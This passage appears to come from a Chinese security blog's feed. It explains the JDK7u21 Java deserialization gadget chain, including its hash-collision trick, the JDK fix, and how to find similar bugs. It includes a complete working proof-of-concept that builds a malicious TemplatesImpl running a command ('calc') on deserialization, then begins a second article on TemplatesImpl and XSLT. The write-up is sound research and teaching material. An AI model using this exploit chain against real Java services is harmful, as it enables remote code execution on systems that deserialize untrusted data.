<span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>) )== <span class="number">15</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"i:"</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算的结果是当i=15，能够让hash(proxy)=5，也就是proxy.hashCode需要是15。当proxy.hashCode=15，map怎么赋值？这就简单了，我们来看下AnnotationInvocationHandler.hashCodeImp，当e.getKey().hashCode()=0，hashCodeImpl返回的值是memberValueHashCode(e.getValue())的值，计算原生类型数组memberValueHashCode()是可控的，我们下面以int数组为例进行计算，当e.getValue() = a[]{-16}能够返回proxy.hashCode是15。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、AnnotationInvocationHandler.hashCodeImpl关键代码</span></span><br><span class="line"><span class="comment">// 当e.getKey().hashCode()==0，当e.getKey()==f5a5a608</span></span><br><span class="line">result += (<span class="number">127</span> * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、 memberValueHashCode(e.getValue())：原生类型</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memberValueHashCode</span><span class="params">(Object var0)</span> </span>&#123;</span><br><span class="line">    Class var1 = var0.getClass();</span><br><span class="line">    <span class="keyword">if</span> (!var1.isArray()) &#123;</span><br><span class="line">        <span class="comment">//非原生类型 </span></span><br><span class="line">        <span class="keyword">return</span> var0.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">char</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">char</span>[])((<span class="keyword">char</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">double</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">double</span>[])((<span class="keyword">double</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">float</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">float</span>[])((<span class="keyword">float</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">int</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">int</span>[])((<span class="keyword">int</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">long</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">long</span>[])((<span class="keyword">long</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">short</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.hashCode((<span class="keyword">short</span>[])((<span class="keyword">short</span>[])var0));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        return var1 == boolean[].class ? Arrays.hashCode((boolean[])((boolean[])var0)) : Arrays.hashCode((Object[])((Object[])var0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、 memberValueHashCode调用AnnotationInvocationHandler.hashCode(int a[])，当返回的result是15时，并且让a数组只有一个元素，element=-16</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> element : a)</span><br><span class="line">        result = <span class="number">31</span> * result + element;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里有人可能会提出一点，当proxy和templates计算出的数组下标刚好一样都是15怎么办？我们可以通过先set.add(proxy)再set.add(templates)，因为JDK1.7 HashMap的插入采用的是<strong>头插法</strong>，这样能让链表中templates在前proxy在后，也能够再读取所有元素时先读templates再读proxy。</p><h4 id="4、关于map-put-quot-f5a5a608-quot-templates-的位置问题"><a href="#4、关于map-put-quot-f5a5a608-quot-templates-的位置问题" class="headerlink" title="4、关于map.put(&quot;f5a5a608&quot;, templates);的位置问题"></a>4、关于<code>map.put(&quot;f5a5a608&quot;, templates);</code>的位置问题</h4><p>有一点是需要说明的就是<code>map.put(&quot;f5a5a608&quot;, templates);</code>的位置，它必须在<code>set.add(proxy);</code>后被执行。在HashSet反序列化时readObject会先执行<code>E e = (E) s.readObject();</code>，再调用HashMap.put，我们知道ObjectInputStream处理序列化时会把目标的属性值反序列化赋给对象的属性，所以s.readObject会先序列化map，然后将其赋值给tempHandler的属性，同理tempHandler赋值给proxy属性，这时候调用HashMap.put就可以触发命令执行。</p><p><img src="/imgs/image-20210718094359578.png" alt="image-20210718094359578"></p><p>那么放在<code>map.put(&quot;f5a5a608&quot;, templates);</code>在<code>set.add(proxy);</code>之前和之后的区别是什么？</p><ol><li>放在之前也是会执行命令的，但是它<strong>不是在反序列化操作时执行</strong>，并且反序列化时会报错找不到我们的恶意类Evil而终止程序。因为<code>map.put(&quot;f5a5a608&quot;, templates);</code>在<code>set.add(proxy);</code>前面，当我们add时会调用HashMap.put从而进行上述2.1的比较操作最终触发命令执行。为什么放在前面反序列化不会触发命令执行并且还报错终止？经过调试发现，templates._class属性原来应该是null，但是经过<code>map.put(&quot;f5a5a608&quot;, templates);set.add(proxy);</code>后，该_class变成了Evil，这时候序列化再反序列化，会读取属性Evil的Class对象来赋值给templates._class，但是由于Evil实际上只有字节码，没有本地的class文件，所以读取Evil.class会报错找不到类。</li><li>放在后面，<code>set.add(proxy);</code>正常添加没有触发执行<code>proxy.equals(TemplatesImpl实例)</code>，并未触发<code>Templates.getOutputProperties()-&gt;_class[i]=loader.defineClass(_bytecodes[i])</code>，所以templates._class还是null，在反序列化时也是正常反序列化，只有在反序列化了proxy并将其put到hashmap时才触发了执行，这时候通过读取_bytecodes将类赋值给templates._class就不会报错。</li><li>所以变化在于templates._class的值，放在前面templates._class不是null，放在后面templates._class是null，前面会在没有反序列化时触发命令执行，templates._class通过Templates.getOutputProperties()调用到了<code>defineClass(_bytecodes[i])</code>就会被赋值，<strong>这时候在反序列化 首先templates._class不是null了，不满足命令执行的条件了</strong>，这也同样能解释为什么在 AnnotationInvocationHandler.equalsImpl()循环调用了Templates的两个方法getOutputProperties()和newTransformer()，但是只执行了一次命令。</li></ol><h3 id="二、类似漏洞的挖掘思路"><a href="#二、类似漏洞的挖掘思路" class="headerlink" title="二、类似漏洞的挖掘思路"></a>二、类似漏洞的挖掘思路</h3><ol><li>具备执行命令的条件：如本次漏洞的TemplatesImpl.getOutputProperties()，TemplatesImpl内部定义了类加载器并重载了defineClass，能够实例化后我们的恶意类从而执行命令。</li><li>利用链的串联，可以通过反向寻找方法的调用，可以借鉴常用的一些反序列化载体如HashMap、HashSet、AnnotationInvocationHandler等。</li><li>反序列化重写了readObject，通过readObject能够最终触发命令执行。中间触发命令执行方法一般用到Method.invoke()来反射调用。</li></ol><h3 id="三、漏洞修复"><a href="#三、漏洞修复" class="headerlink" title="三、漏洞修复"></a>三、漏洞修复</h3><p>在我本地有个JDK1.8.0_181的环境，在AnnotationInvocationHandler.readObject()里面添加了对AnnotationInvocationHandler.Annotation的类型进行了检查，针对不是AnnotationType做出了进行了异常抛出以中断执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    var5 = AnnotationType.getInstance(var3);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四、POC"><a href="#四、POC" class="headerlink" title="四、POC"></a>四、POC</h3><p>参考<a href="https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#AnnotationInvocationHandler" target="_blank" rel="noopener">l3yx的poc</a>进行修改并调试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射为obj的属性赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装了之前对恶意TemplatesImpl类的构造</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getEvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Evil"</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())))</span>;<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">"&#123; Runtime.getRuntime().exec(\"calc\"); &#125;"</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteCode = cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCode = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;byteCode&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCode);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"xx"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        expHashSet();</span><br><span class="line"><span class="comment">//        expLinkedHashSet();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">expLinkedHashSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl templates = getEvilTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler</span></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理，用tempHandler代理Templates接口，AnnotationInvocationHandler的invoke代理Templates接口的两个方法newTransformer()和getOutputProperties()</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Poc<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(), <span class="title">templates</span>.<span class="title">getClass</span>().<span class="title">getInterfaces</span>(), <span class="title">tempHandler</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line">        map.put(<span class="string">"f5a5a608"</span>, templates);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">byte</span>[] obj = serialize(set);</span><br><span class="line">        unserialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">expHashSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl templates = getEvilTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"f5a5a608"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">16</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler</span></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理，用tempHandler代理Templates接口，AnnotationInvocationHandler的invoke代理Templates接口的两个方法newTransformer()和getOutputProperties()</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Poc<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(), <span class="title">templates</span>.<span class="title">getClass</span>().<span class="title">getInterfaces</span>(), <span class="title">tempHandler</span>)</span>;</span><br><span class="line"></span><br><span class="line">        HashSet set = <span class="keyword">new</span> HashSet();</span><br><span class="line">        set.add(proxy);</span><br><span class="line">        set.add(templates);</span><br><span class="line">        map.put(<span class="string">"f5a5a608"</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] obj = serialize(set);</span><br><span class="line">        unserialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3" target="_blank" rel="noopener">https://gist.github.com/frohoff/24af7913611f8406eaf3</a><br><a href="https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/" target="_blank" rel="noopener">https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/</a><br>phith0n：Java安全漫谈 - 18.原生反序列化利用链JDK7u21<br><a href="https://xz.aliyun.com/t/9704" target="_blank" rel="noopener">https://xz.aliyun.com/t/9704</a><br><a href="https://www.cnblogs.com/wlrhnh/p/7256969.html" target="_blank" rel="noopener">https://www.cnblogs.com/wlrhnh/p/7256969.html</a><br><a href="http://blog.csdn.net/justloveyou_/article/details/62893086" target="_blank" rel="noopener">http://blog.csdn.net/justloveyou_/article/details/62893086</a><br><a href="https://blog.csdn.net/justloveyou_/article/details/71713781" target="_blank" rel="noopener">https://blog.csdn.net/justloveyou_/article/details/71713781</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDK7U21 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由JDK7u21反序列化漏洞引起的对TemplatesImpl的深入学习</title>
      <link href="2021/07/19/%E7%94%B1JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AF%B9TemplatesImpl%E7%9A%84%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/07/19/%E7%94%B1JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AF%B9TemplatesImpl%E7%9A%84%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>文章首发于安全客：<a href="https://www.anquanke.com/post/id/247044" target="_blank" rel="noopener">https://www.anquanke.com/post/id/247044</a></p><p>最近在分析JDK7u21反序列化漏洞，对命令执行载体<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的利用点不太明白。除了JDK7u21，<code>TemplatesImpl</code>在很多反序列化漏洞中都被利用了，所以想要深入探究下它到底是做什么用的，有什么特性被利用。接下来本文将从这两个问题进行探索学习。</p><h2 id="一、了解TemplatesImpl"><a href="#一、了解TemplatesImpl" class="headerlink" title="一、了解TemplatesImpl"></a>一、了解TemplatesImpl</h2><h3 id="1、XSLT"><a href="#1、XSLT" class="headerlink" title="1、XSLT"></a>1、XSLT</h3><p><strong>在开始前首先了解下<a href="https://www.runoob.com/xsl/xsl-transformation.html" target="_blank" rel="noopener">XSLT</a>：</strong></p><ul><li>XSL 指扩展样式表语言（EXtensible Stylesheet Language）, 它是一个 XML 文档的样式表语言，类似CSS之于HTML；</li><li>XSLT（Extensible Stylesheet Language Transformations）是XSL转换语言，它是XSL的一部分，用于转换 XML 文档，可将一种 XML 文档转换为另外一种 XML 文档，如XHTML；</li></ul><p><strong>简化版<a href="https://www.runoob.com/try/tryxslt.php?xmlfile=cdcatalog&xsltfile=cdcatalog_ex1" target="_blank" rel="noopener">XSLT实例</a>：</strong></p><p>我们从一个例子来了解下XSLT，将XML转为HTML格式展示。</p><p>XML：cdcatalog.xml，保存了文章数据包括文章标题、作者等。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 这里加上这句 将向XML文档添加下面cdcatalog.xsl的样式表引用 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;?xml-stylesheet type="text/xsl" href="cdcatalog.xsl"?&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Empire Burlesque<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Bob Dylan<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Columbia<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1985<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hide your heart<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Bonnie Tyler<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>CBS Records<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1988<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XSL：cdcatalog.xsl</p><p>XSL 样式表的根元素是 <code>&lt;xsl:stylesheet&gt;</code> 或 <code>&lt;xsl:transform&gt;</code>；<br><code>&lt;xsl:output&gt;</code>元素定义了输出文档的格式；<br>XSL 样式表由一个或多个被称为模板（template）的规则组成，<a href="xsl:template">xsl:template</a> 元素用于构建模板。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 表示输出是 HTML 文档，版本是 4.0，字符编码方式被设置为 "ISO-8859-1"，输出会进行缩进，以增进可读性 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">"html"</span> <span class="attr">version</span>=<span class="string">"4.0"</span> <span class="attr">encoding</span>=<span class="string">"iso-8859-1"</span> <span class="attr">indent</span>=<span 